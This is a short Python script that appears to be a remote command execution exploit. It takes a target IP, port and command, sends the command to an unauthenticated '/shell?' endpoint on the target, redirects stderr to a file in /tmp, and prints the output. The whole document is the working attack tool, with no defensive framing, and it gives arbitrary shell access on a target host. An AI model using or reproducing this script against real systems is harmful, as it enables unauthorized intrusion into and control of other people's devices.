#! /usr/bin/python3
import argparse
import requests
parser = argparse.ArgumentParser()
parser.add_argument("-u",help="target URL,format is http://ip:portNumber")
parser.add_argument("-i",help="target ip")
parser.add_argument("-p",help="target port")
parser.add_argument("-c",help="commend to excute")
parse = parser.parse_args()
class execute:
	def __init__(self,ip,port,commend):
		#if len(kwargs) == 3:
			self.ip = ip
			self.port = port
			self.commend = commend
			shell_exec = "http://%s:%s/shell?%s "%(ip,port,commend)+"2>/tmp/tmp.txt;cat /tmp/tmp.txt"
		#elif len(kwargs) == 2:
		#	self.url = url
		#	self.commend = commend
		#	shell_exec = url+"/shell?%s"%commend+" 2> /tmp/tmp.txt;cat /tmp/tmp.txt"
		#else:
		#	print("Please input url and commend or ip and port and commend")
		#	return
			output = requests.get(url=shell_exec)
			print(output.text)

if __name__ == "__main__":
	
	instent = execute(parse.i,parse.p,parse.c)
